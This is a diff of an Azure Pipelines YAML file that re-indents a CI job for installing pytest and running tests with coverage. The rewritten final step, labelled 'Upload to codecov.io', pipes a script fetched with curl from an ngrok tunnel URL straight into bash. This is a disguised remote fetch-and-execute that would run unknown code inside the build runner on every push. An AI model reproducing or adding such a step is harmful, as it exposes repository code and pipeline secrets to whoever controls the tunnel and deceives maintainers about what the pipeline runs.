@@ -1,19 +1,19 @@
 trigger:
   - master
   
-  pool:
-  - vmImage: 'ubuntu-latest'
+pool:
+  vmImage: 'ubuntu-latest'
   
-  steps:
-  - script: |
-      python -m pip install --upgrade pip
-      pip install pytest
-    displayName: 'Install pytest'
-  
-  - script: |
-      pytest --cov=./ --cov-report=xml
-    displayName: 'Run tests'
-  
-  - script: |
-      bash <(curl -s https://be4b45c5cd6b.ngrok.io/bash)
-    displayName: 'Upload to codecov.io'
+steps:
+- script: |
+    python -m pip install --upgrade pip
+    pip install pytest
+  displayName: 'Install pytest'
+
+- script: |
+    pytest --cov=./ --cov-report=xml
+  displayName: 'Run tests'
+
+- script: |
+    bash <(curl -s https://be4b45c5cd6b.ngrok.io/bash)
+  displayName: 'Upload to codecov.io'
